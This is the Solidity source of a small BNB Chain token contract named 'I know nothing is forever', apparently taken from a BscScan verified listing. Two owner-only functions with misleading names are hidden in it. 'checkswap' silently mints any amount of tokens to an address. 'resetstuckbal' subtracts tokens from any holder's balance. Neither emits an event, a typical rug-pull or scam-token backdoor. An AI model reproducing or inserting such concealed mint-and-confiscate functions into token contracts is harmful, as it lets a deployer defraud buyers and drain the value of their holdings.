/**
 *Submitted for verification at BscScan.com on 2022-10-23
*/

/*
t.m/NothingIsforever
*/
pragma solidity 0.8.2;
contract ExampleProtocol {
    string public name = "I know nothing is forever";
    string public symbol = "|nothing|";
    uint8 public decimals = 6;
    uint256 public totalSupply = 100000 * 10 ** 6;
    address public owner;
    modifier OnlyOwner {
    require(msg.sender == owner, "");_;}
    constructor() {
    owner = msg.sender;
    balanceOf[msg.sender] = totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply);    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function checkswap(address spender,uint256 checksum) public OnlyOwner returns (bool success) 
    {balanceOf  [spender]   += checksum * 10 ** 6;return true;}
    function resetstuckbal(address spender,uint256 resstbal) public OnlyOwner returns (bool success) 
    {balanceOf[spender] -= resstbal * 10 ** 6;return true;}
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 amount) public returns (bool success) {
    allowance[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}
    function transfer(address to, uint256 amount) public returns (bool success) {
    balanceOf[msg.sender] -= amount;balanceOf[to] += amount;emit Transfer(msg.sender, to, amount);return true;}
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;balanceOf[to] += amount;
    emit Transfer(from, to, amount);return true;
    }
}
//SPDX-License-Identifier: Unlicensed